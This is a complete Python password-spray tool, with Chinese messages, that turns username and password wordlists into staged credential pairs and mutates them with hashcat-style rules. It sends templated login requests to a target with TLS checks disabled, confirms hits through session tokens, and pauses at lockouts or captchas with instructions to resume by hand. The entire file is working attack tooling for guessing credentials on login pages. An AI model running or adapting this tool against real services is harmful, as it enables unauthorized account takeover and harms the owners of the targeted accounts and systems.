#!/usr/bin/env python3
"""Password-spray helper. Base dictionaries are read-only. Output stays under the target spray directory."""

from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
WL = ROOT / "wordlist"
PASS_TOP2 = WL / "pass" / "top2.txt"
PASS_TOP10 = WL / "pass" / "top10.txt"
PASS_TOP100 = WL / "pass" / "top100.txt"
PASS_ADMIN = WL / "admin.txt"
USER_COMMON = WL / "user" / "常见用户名.txt"
USER_NAMES = WL / "user" / "常见姓名3000.txt"
USER_BIG = WL / "user" / "常用密码+用户名+首字母+姓.txt"
RULES = ROOT / "hashcat 规则.txt"


def read_lines(path: Path) -> list[str]:
    if not path.is_file():
        raise SystemExit(f"缺少字典: {path}")
    out = []
    seen = set()
    for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or line in seen:
            continue
        seen.add(line)
        out.append(line)
    return out


def need_set(text: str) -> set[str]:
    if not text:
        return set()
    return {part.strip() for part in text.split(",") if part.strip()}


def allow_password(word: str, min_len: int, max_len: int, need: set[str]) -> bool:
    if min_len and len(word) < min_len:
        return False
    if max_len and len(word) > max_len:
        return False
    if "digit" in need and not any(ch.isdigit() for ch in word):
        return False
    if "lower" in need and not any(ch.islower() for ch in word):
        return False
    if "upper" in need and not any(ch.isupper() for ch in word):
        return False
    if "special" in need and not any(not ch.isalnum() for ch in word):
        return False
    return True


def filter_passwords(words: list[str], min_len: int, max_len: int, need: set[str]) -> list[str]:
    return [word for word in words if allow_password(word, min_len, max_len, need)]


def assert_outside_wordlist(path: Path) -> None:
    resolved = path.resolve()
    if WL.resolve() in resolved.parents or resolved == WL.resolve():
        raise SystemExit(f"拒绝写入底库: {resolved}")


def write_pairs(path: Path, pairs: list[tuple[str, str]]) -> None:
    assert_outside_wordlist(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(f"{user}\t{password}\n" for user, password in pairs), encoding="utf-8")


def pos_of(ch: str) -> int | None:
    if ch.isdigit():
        return int(ch)
    if "A" <= ch <= "Z":
        return ord(ch) - ord("A") + 10
    if "a" <= ch <= "z":
        return ord(ch) - ord("a") + 10
    return None


def apply_rule(word: str, rule: str) -> str | None:
    cur = word
    mem = ""
    i = 0
    n = len(rule)
    while i < n:
        op = rule[i]
        i += 1
        if op == " ":
            continue
        if op == ":":
            continue
        if op == "l":
            cur = cur.lower()
        elif op == "u":
            cur = cur.upper()
        elif op == "c":
            cur = cur[:1].upper() + cur[1:].lower()
        elif op == "C":
            cur = cur[:1].lower() + cur[1:].upper()
        elif op == "t":
            cur = cur.swapcase()
        elif op == "T":
            if i >= n:
                return None
            p = pos_of(rule[i])
            i += 1
            if p is None or p >= len(cur):
                return None
            ch = cur[p]
            cur = cur[:p] + ch.swapcase() + cur[p + 1 :]
        elif op == "r":
            cur = cur[::-1]
        elif op == "d":
            cur = cur + cur
        elif op == "p":
            if i >= n:
                return None
            times = pos_of(rule[i])
            i += 1
            if times is None:
                return None
            cur = cur + cur * times
        elif op == "f":
            cur = cur + cur[::-1]
        elif op == "{":
            cur = cur[1:] + cur[:1] if cur else cur
        elif op == "}":
            cur = cur[-1:] + cur[:-1] if cur else cur
        elif op == "$":
            if i >= n:
                return None
            cur = cur + rule[i]
            i += 1
        elif op == "^":
            if i >= n:
                return None
            cur = rule[i] + cur
            i += 1
        elif op == "[":
            cur = cur[1:]
        elif op == "]":
            cur = cur[:-1]
        elif op == "D":
            if i >= n:
                return None
            p = pos_of(rule[i])
            i += 1
            if p is None or p >= len(cur):
                return None
            cur = cur[:p] + cur[p + 1 :]
        elif op == "i":
            if i + 1 >= n:
                return None
            p = pos_of(rule[i])
            ch = rule[i + 1]
            i += 2
            if p is None:
                return None
            p = min(p, len(cur))
            cur = cur[:p] + ch + cur[p:]
        elif op == "o":
            if i + 1 >= n:
                return None
            p = pos_of(rule[i])
            ch = rule[i + 1]
            i += 2
            if p is None or p >= len(cur):
                return None
            cur = cur[:p] + ch + cur[p + 1 :]
        elif op == "'":
            if i >= n:
                return None
            p = pos_of(rule[i])
            i += 1
            if p is None:
                return None
            cur = cur[:p]
        elif op == "s":
            if i + 1 >= n:
                return None
            cur = cur.replace(rule[i], rule[i + 1])
            i += 2
        elif op == "@":
            if i >= n:
                return None
            cur = cur.replace(rule[i], "")
            i += 1
        elif op == "z":
            if i >= n or not cur:
                return None
            times = pos_of(rule[i])
            i += 1
            if times is None:
                return None
            cur = cur[0] * times + cur
        elif op == "Z":
            if i >= n or not cur:
                return None
            times = pos_of(rule[i])
            i += 1
            if times is None:
                return None
            cur = cur + cur[-1] * times
        elif op == "q":
            cur = "".join(ch * 2 for ch in cur)
        elif op == "M":
            mem = cur
        elif op == "4":
            cur = cur + mem
        elif op == "6":
            cur = mem + cur
        elif op == "X":
            if i + 2 >= n:
                return None
            start = pos_of(rule[i])
            length = pos_of(rule[i + 1])
            insert = pos_of(rule[i + 2])
            i += 3
            if None in (start, length, insert):
                return None
            piece = mem[start : start + length]
            insert = min(insert, len(cur))
            cur = cur[:insert] + piece + cur[insert:]
        else:
            return None
        if len(cur) > 256:
            return None
    return cur


def load_rules(path: Path) -> tuple[list[str], int]:
    good = []
    bad = 0
    for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
        rule = raw.strip()
        if not rule or rule.startswith("#"):
            continue
        if apply_rule("abc", rule) is None and apply_rule("Ab1!", rule) is None:
            bad += 1
            continue
        good.append(rule)
    return good, bad


def mutate(seeds: list[str], rules: list[str], cap: int, keep) -> list[str]:
    out = []
    seen = set()
    for seed in seeds:
        if seed and seed not in seen and keep(seed):
            seen.add(seed)
            out.append(seed)
            if cap and len(out) >= cap:
                return out
        for rule in rules:
            got = apply_rule(seed, rule)
            if not got or got in seen or not keep(got):
                continue
            seen.add(got)
            out.append(got)
            if cap and len(out) >= cap:
                return out
    return out


def host_token(url: str) -> str:
    host = url.split("//", 1)[-1].split("/", 1)[0].split(":")[0]
    parts = [part for part in host.split(".") if part and part not in {"www", "com", "cn", "net"}]
    return parts[0] if parts else host


def build_plan(out: Path, min_len: int, max_len: int, need: set[str], enum_path: Path | None, note: str) -> dict:
    assert_outside_wordlist(out)
    top2 = filter_passwords(read_lines(PASS_TOP2), min_len, max_len, need)
    top10 = filter_passwords(read_lines(PASS_TOP10), min_len, max_len, need)
    top100 = filter_passwords(read_lines(PASS_TOP100), min_len, max_len, need)
    admin = filter_passwords(read_lines(PASS_ADMIN), min_len, max_len, need)
    users = read_lines(USER_COMMON)
    names = read_lines(USER_NAMES)
    big = read_lines(USER_BIG)
    enum_users = read_lines(enum_path) if enum_path else []

    stages = []

    def add(name: str, title: str, passwords: list[str], usernames: list[str], raw_pass: int, skip: set[tuple[str, str]] | None = None):
        pairs = []
        skipped = 0
        for user in usernames:
            for password in passwords:
                item = (user, password)
                if skip and item in skip:
                    skipped += 1
                    continue
                pairs.append(item)
        path = out / "pairs" / f"{name}.txt"
        write_pairs(path, pairs)
        stages.append(
            {
                "name": name,
                "title": title,
                "raw_passwords": raw_pass,
                "passwords": len(passwords),
                "usernames": len(usernames),
                "pairs": len(pairs),
                "skipped_dup": skipped,
                "file": str(path),
            }
        )
        return {(user, password) for user, password in pairs}

    done2 = add("stage2", "top10 × 常见用户名", top10, users, len(read_lines(PASS_TOP10)))
    done3 = add("stage3", "top10 × 常见姓名3000", top10, names, len(read_lines(PASS_TOP10)))
    add("stage1", "top2 × 常用密码+用户名+首字母+姓", top2, big, len(read_lines(PASS_TOP2)))
    add("stage4", "top10 × 用户名并集（跳过已覆盖）", top10, users + [n for n in names if n not in set(users)], len(read_lines(PASS_TOP10)), done2 | done3)
    add("stage5", "枚举用户 × top100", top100, enum_users, len(read_lines(PASS_TOP100)))
    add("stage6", "admin × admin.txt", admin, ["admin"], len(read_lines(PASS_ADMIN)))
    order = ["stage1", "stage2", "stage3", "stage4", "stage5", "stage6"]
    stages.sort(key=lambda item: order.index(item["name"]))
    manifest = {
        "policy": {"min_len": min_len, "max_len": max_len, "need": sorted(need), "note": note},
        "order": ["stage1", "stage2", "stage3", "stage4", "stage5", "stage6", "stage7"],
        "stages": stages,
        "stage7": "命中或枚举确认的用户才生成，本步不预先展开",
    }
    (out / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    return manifest


def load_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


_ENCRYPT = {}


def load_encrypt(path: str):
    if path not in _ENCRYPT:
        import importlib.util

        spec = importlib.util.spec_from_file_location("spray_encrypt", path)
        if spec is None or spec.loader is None:
            raise SystemExit(f"读不到加密函数: {path}")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        if not hasattr(module, "transform"):
            raise SystemExit("encrypt.py 必须有 transform(user, password)")
        _ENCRYPT[path] = module
    return _ENCRYPT[path]


def fields_for(template: dict, user: str, password: str) -> dict:
    fields = {"user": user, "pass": password}
    hook = template.get("encrypt") or ""
    if not hook:
        return fields
    got = load_encrypt(hook).transform(user, password)
    if not isinstance(got, dict) or "pass" not in got:
        raise SystemExit("transform 必须返回字典，且包含 pass")
    fields.update({str(key): "" if value is None else str(value) for key, value in got.items()})
    return fields


def encode_field(value: str, ctype: str) -> str:
    if "application/json" in ctype:
        return json.dumps(value)[1:-1]
    if "application/x-www-form-urlencoded" in ctype:
        from urllib.parse import quote_plus

        return quote_plus(value)
    return value


def fill_template(text: str, fields: dict, ctype: str) -> str:
    for key, value in fields.items():
        text = text.replace("{{" + key + "}}", encode_field(value, ctype))
    return text


def http_send(template: dict, user: str, password: str, timeout: float) -> dict:
    url = template["url"]
    method = template.get("method", "POST").upper()
    headers = {str(k): str(v) for k, v in template.get("headers", {}).items()}
    body = template.get("body", "")
    ctype = headers.get("Content-Type", headers.get("content-type", ""))
    fields = fields_for(template, user, password)
    data_text = fill_template(body, fields, ctype)
    url = fill_template(url, fields, "")
    data = data_text.encode("utf-8")
    if method == "GET":
        data = None
    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    proxy = template.get("proxy", "http://127.0.0.1:8080")
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    context = ssl._create_unverified_context()
    handlers.append(urllib.request.HTTPSHandler(context=context))
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(request, timeout=timeout) as response:
            raw = response.read(200000)
            return {
                "status": response.status,
                "headers": dict(response.headers.items()),
                "body": raw.decode("utf-8", errors="replace"),
                "url": response.geturl(),
            }
    except urllib.error.HTTPError as exc:
        raw = exc.read(200000)
        return {
            "status": exc.code,
            "headers": dict(exc.headers.items()) if exc.headers else {},
            "body": raw.decode("utf-8", errors="replace"),
            "url": url,
        }


def header_blob(headers: dict) -> str:
    return "\n".join(f"{k}: {v}" for k, v in headers.items())


def classify(resp: dict, judge: dict) -> str:
    text = resp["body"] + "\n" + header_blob(resp["headers"])
    for phrase in judge.get("stop_phrases", []):
        if phrase and phrase in text:
            return "stop"
    fail = judge.get("fail_phrase", "")
    if fail and fail in text:
        return "fail"
    signal = judge.get("success_signal", "")
    if signal and signal in text:
        return "maybe"
    if fail and fail not in text and resp["status"] != judge.get("fail_status"):
        return "maybe"
    return "fail"


def confirm_login(template: dict, judge: dict, login: dict, timeout: float) -> tuple[bool, str]:
    conf = judge["confirm"]
    headers = {str(k): str(v) for k, v in conf.get("headers", {}).items()}
    value_from = conf.get("value_from", "set-cookie")
    if value_from == "set-cookie":
        cookie = login["headers"].get("Set-Cookie") or login["headers"].get("set-cookie") or ""
        headers[conf.get("header", "Cookie")] = cookie
    else:
        import re

        match = re.search(conf.get("body_regex", ""), login["body"])
        if not match:
            return False, "登录回包没有取出票据"
        token = match.group(1)
        headers[conf.get("header", "Authorization")] = conf.get("prefix", "") + token
    request_template = {
        "url": conf["url"],
        "method": conf.get("method", "GET"),
        "headers": headers,
        "body": conf.get("body", ""),
        "proxy": template.get("proxy", "http://127.0.0.1:8080"),
    }
    resp = http_send(request_template, "", "", timeout)
    phrase = conf["pass_phrase"]
    ok = phrase in resp["body"]
    return ok, f"status={resp['status']} len={len(resp['body'])} phrase={ok}"


def negative_confirm(template: dict, judge: dict, timeout: float) -> tuple[bool, str]:
    conf = judge["confirm"]
    request_template = {
        "url": conf["url"],
        "method": conf.get("method", "GET"),
        "headers": conf.get("headers", {}),
        "body": conf.get("body", ""),
        "proxy": template.get("proxy", "http://127.0.0.1:8080"),
    }
    resp = http_send(request_template, "", "", timeout)
    phrase = conf["pass_phrase"]
    if phrase in resp["body"]:
        return False, "未登录也能看到确认句，不能判断成功"
    return True, f"未登录确认口 status={resp['status']} len={len(resp['body'])}"


def render_report(path: Path, meta: dict, stages: list[dict], hits: list[dict], stop: dict | None) -> None:
    lines = [
        f"目标: {meta.get('url', '')}",
        f"模板: {meta.get('template', '')}",
        f"口令规则: {meta.get('policy_note') or '未识别，密码字典未删'}",
        f"失败基线: status={meta.get('fail_status')} phrase={meta.get('fail_phrase')}",
        f"成功判定: 离开失败句 + 同一对重放仍离开 + 鉴权口出现「{meta.get('pass_phrase', '')}」且未登录没有这句话",
        "",
        "阶段\t原密码\t过滤后\t用户\t计划\t实打\t跳过\t命中\t结果",
    ]
    for stage in stages:
        lines.append(
            "\t".join(
                str(stage.get(key, ""))
                for key in ("title", "raw_passwords", "passwords", "usernames", "pairs", "sent", "skipped_dup", "hits", "result")
            )
        )
    lines.append("")
    if hits:
        lines.append("命中:")
        for hit in hits:
            lines.append(f"{hit['user']}\t{hit['password']}\t{hit['confirm']}")
    else:
        lines.append("命中: 无")
    lines.append("")
    if stop:
        lines.append(f"中断: {stop['stage']} 第 {stop['index']} 对 原因 {stop['reason']}")
        lines.append(f"人工续爆: 从 {stop['file']} 第 {stop['index']} 行继续。不要换字典。字典={stop['title']}")
    else:
        lines.append("中断: 无。七段里有对的阶段都已打完。")
        empty = [stage["title"] for stage in stages if stage.get("pairs") == 0]
        if empty:
            lines.append("未打阶段: " + "；".join(empty))
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def cmd_report(args: argparse.Namespace) -> None:
    out = Path(args.dir)
    manifest = load_json(out / "manifest.json")
    rows = []
    hits = []
    stop = None
    for stage in manifest["stages"]:
        name = stage["name"]
        progress_path = out / "progress" / f"{name}.json"
        progress = load_json(progress_path) if progress_path.is_file() else {"index": 0, "hits": [], "sent": 0}
        sent = progress.get("sent", 0)
        stage_hits = progress.get("hits", [])
        hits.extend(stage_hits)
        result = "未打"
        if stage["pairs"] == 0:
            result = "无可用对"
        elif sent >= stage["pairs"] and not progress.get("stop"):
            result = "打完"
        elif progress.get("stop"):
            result = "中断"
            stop = {
                "stage": name,
                "title": stage["title"],
                "index": progress["stop"]["index"],
                "reason": progress["stop"]["reason"],
                "file": stage["file"],
            }
        elif sent < stage["pairs"]:
            result = "未打完" if sent else "未打"
            if stop is None:
                stop = {
                    "stage": name,
                    "title": stage["title"],
                    "index": progress.get("index", 0),
                    "reason": "还没打完" if sent else "还没打",
                    "file": stage["file"],
                }
        rows.append({**stage, "sent": sent, "hits": len(stage_hits), "result": result})
    meta = {
        "url": args.url,
        "template": args.template,
        "policy_note": manifest["policy"].get("note") or "",
        "fail_status": args.fail_status,
        "fail_phrase": args.fail_phrase,
        "pass_phrase": args.pass_phrase,
    }
    if manifest["policy"]["need"] or manifest["policy"]["min_len"] or manifest["policy"]["max_len"]:
        policy = manifest["policy"]
        meta["policy_note"] = meta["policy_note"] or f"min={policy['min_len']} max={policy['max_len']} need={','.join(policy['need'])}"
    report = out / "report.md"
    render_report(report, meta, rows, hits, stop)
    print(report)


def cmd_plan(args: argparse.Namespace) -> None:
    need = need_set(args.need)
    enum_path = Path(args.enum) if args.enum else None
    manifest = build_plan(Path(args.out), args.min_len, args.max_len, need, enum_path, args.note)
    for stage in manifest["stages"]:
        print(f"{stage['name']}\t{stage['title']}\t过滤后密码 {stage['passwords']}\t对 {stage['pairs']}\t跳过 {stage['skipped_dup']}")


def cmd_mutate(args: argparse.Namespace) -> None:
    rules, bad = load_rules(RULES)
    users = read_lines(Path(args.users))
    seeds = read_lines(Path(args.seeds)) if args.seeds else []
    out = Path(args.out)
    pairs = []
    generated = 0
    for user in users:
        local_seeds = [user, *seeds]
        need = need_set(args.need)
        words = mutate(
            local_seeds,
            rules,
            args.cap,
            lambda word: allow_password(word, args.min_len, args.max_len, need),
        )
        generated += len(words)
        pairs.extend((user, word) for word in words)
    write_pairs(out, pairs)
    print(f"rules_ok={len(rules)} rules_bad={bad} generated={generated} pairs={len(pairs)} file={out}")


def cmd_baseline(args: argparse.Namespace) -> None:
    template = load_json(Path(args.template))
    first = http_send(template, "__no_such__", "__NoSuch_9!", args.timeout)
    time.sleep(args.delay)
    second = http_send(template, "__no_such__", "__NoSuch_9!", args.timeout)
    same = first["status"] == second["status"] and abs(len(first["body"]) - len(second["body"])) <= max(8, int(len(first["body"]) * 0.02))
    payload = {
        "stable": same,
        "status": first["status"],
        "len1": len(first["body"]),
        "len2": len(second["body"]),
        "sha1": hashlib.sha256(first["body"].encode("utf-8", errors="replace")).hexdigest(),
        "body_sample": first["body"][:500],
    }
    Path(args.out).write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    if not same:
        raise SystemExit("失败基线不稳定，禁止开打")
    print(f"baseline_ok status={first['status']} len={len(first['body'])}")


def cmd_run(args: argparse.Namespace) -> None:
    template = load_json(Path(args.template))
    judge = load_json(Path(args.judge))
    for key in ("fail_phrase", "fail_status"):
        if key not in judge:
            raise SystemExit(f"judge 缺 {key}")
    hit_mode = judge.get("hit", "session")
    if hit_mode == "session":
        if "confirm" not in judge:
            raise SystemExit("judge 缺 confirm")
        if "pass_phrase" not in judge["confirm"] or "url" not in judge["confirm"]:
            raise SystemExit("judge.confirm 缺 url 或 pass_phrase")
    elif hit_mode != "split":
        raise SystemExit("judge.hit 只能是 session 或 split")
    if args.baseline:
        base = load_json(Path(args.baseline))
        if not base.get("stable"):
            raise SystemExit("失败基线不稳定，禁止开打")
        sample = base.get("body_sample", "")
        for phrase in judge.get("stop_phrases", []):
            if phrase and phrase in sample:
                raise SystemExit(f"失败基线已含「{phrase}」，口令成败被挡住，禁止开打")
    detail = "split：只要求错密和对密分开"
    if hit_mode == "session":
        ok, detail = negative_confirm(template, judge, args.timeout)
        if not ok:
            raise SystemExit(detail)
    pairs = []
    for line in Path(args.pairs).read_text(encoding="utf-8").splitlines():
        if "\t" not in line:
            continue
        user, password = line.split("\t", 1)
        pairs.append((user, password))
    progress_path = Path(args.progress)
    progress = load_json(progress_path) if progress_path.is_file() else {"index": 0, "hits": [], "sent": 0}
    log_path = Path(args.log)
    assert_outside_wordlist(log_path)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    stop = None
    with log_path.open("a", encoding="utf-8") as handle:
        for index in range(progress["index"], len(pairs)):
            user, password = pairs[index]
            resp = http_send(template, user, password, args.timeout)
            kind = classify(resp, judge)
            row = {"i": index, "user": user, "password": password, "status": resp["status"], "len": len(resp["body"]), "class": kind}
            if kind == "maybe":
                time.sleep(args.delay)
                again = http_send(template, user, password, args.timeout)
                if classify(again, judge) != "maybe":
                    kind = "fail"
                    row["class"] = "replay_fail"
                elif hit_mode == "split":
                    hit = {"user": user, "password": password, "confirm": "口令已分开，未进业务"}
                    progress["hits"].append(hit)
                    row["class"] = "hit"
                    row["confirm"] = hit["confirm"]
                    kind = "hit"
                else:
                    confirmed, how = confirm_login(template, judge, again, args.timeout)
                    if not confirmed:
                        kind = "fail"
                        row["class"] = "confirm_fail"
                        row["confirm"] = how
                    else:
                        hit = {"user": user, "password": password, "confirm": how}
                        progress["hits"].append(hit)
                        row["class"] = "hit"
                        row["confirm"] = how
            handle.write(json.dumps(row, ensure_ascii=False) + "\n")
            progress["index"] = index + 1
            progress["sent"] = progress.get("sent", 0) + 1
            progress_path.write_text(json.dumps(progress, ensure_ascii=False, indent=2), encoding="utf-8")
            if kind == "stop":
                stop = {"index": index, "reason": "锁定或验证码或频率限制", "file": args.pairs}
                progress["stop"] = stop
                progress_path.write_text(json.dumps(progress, ensure_ascii=False, indent=2), encoding="utf-8")
                break
            if kind != "hit":
                time.sleep(args.delay)
    print(json.dumps({"sent": progress["sent"], "hits": progress["hits"], "stop": stop, "negative_confirm": detail}, ensure_ascii=False))


def self_test() -> None:
    assert allow_password("a", 8, 0, {"digit", "upper", "lower", "special"}) is False
    assert allow_password("Abcd123!", 8, 0, {"digit", "upper", "lower", "special"}) is True
    assert apply_rule("admin", "c") == "Admin"
    assert apply_rule("admin", "$!") == "admin!"
    assert apply_rule("abc", "d") == "abcabc"
    assert apply_rule("abc", "q") == "aabbcc"
    assert apply_rule("abc", "f") == "abccba"
    got = apply_rule("pass", "uMl4")
    assert got == "passPASS", got
    try:
        write_pairs(WL / "nope.txt", [("a", "b")])
    except SystemExit:
        pass
    else:
        raise SystemExit("wordlist write guard failed")
    hook = Path("/tmp/spray-encrypt-test.py")
    hook.write_text("def transform(user, password):\n    return {'user': user, 'pass': password[::-1]}\n", encoding="utf-8")
    got = fields_for({"encrypt": str(hook)}, "admin", "abc")
    assert got["pass"] == "cba", got
    assert fill_template('{"p":"{{pass}}"}', got, "application/json") == '{"p":"cba"}'
    hook.unlink()
    print("self_test_ok")


def main() -> None:
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)

    plan = sub.add_parser("plan")
    plan.add_argument("--out", required=True)
    plan.add_argument("--min-len", type=int, default=0)
    plan.add_argument("--max-len", type=int, default=0)
    plan.add_argument("--need", default="")
    plan.add_argument("--note", default="")
    plan.add_argument("--enum", default="")
    plan.set_defaults(func=cmd_plan)

    report = sub.add_parser("report")
    report.add_argument("--dir", required=True)
    report.add_argument("--url", required=True)
    report.add_argument("--template", required=True)
    report.add_argument("--fail-status", default="")
    report.add_argument("--fail-phrase", default="")
    report.add_argument("--pass-phrase", default="")
    report.set_defaults(func=cmd_report)

    gen = sub.add_parser("mutate")
    gen.add_argument("--out", required=True)
    gen.add_argument("--users", required=True)
    gen.add_argument("--seeds", default="")
    gen.add_argument("--cap", type=int, default=0)
    gen.add_argument("--min-len", type=int, default=0)
    gen.add_argument("--max-len", type=int, default=0)
    gen.add_argument("--need", default="")
    gen.set_defaults(func=cmd_mutate)

    base = sub.add_parser("baseline")
    base.add_argument("--template", required=True)
    base.add_argument("--out", required=True)
    base.add_argument("--delay", type=float, default=1)
    base.add_argument("--timeout", type=float, default=20)
    base.set_defaults(func=cmd_baseline)

    run = sub.add_parser("run")
    run.add_argument("--baseline", default="")
    run.add_argument("--template", required=True)
    run.add_argument("--judge", required=True)
    run.add_argument("--pairs", required=True)
    run.add_argument("--progress", required=True)
    run.add_argument("--log", required=True)
    run.add_argument("--delay", type=float, default=1)
    run.add_argument("--timeout", type=float, default=20)
    run.set_defaults(func=cmd_run)

    sub.add_parser("self-test").set_defaults(func=lambda _args: self_test())
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
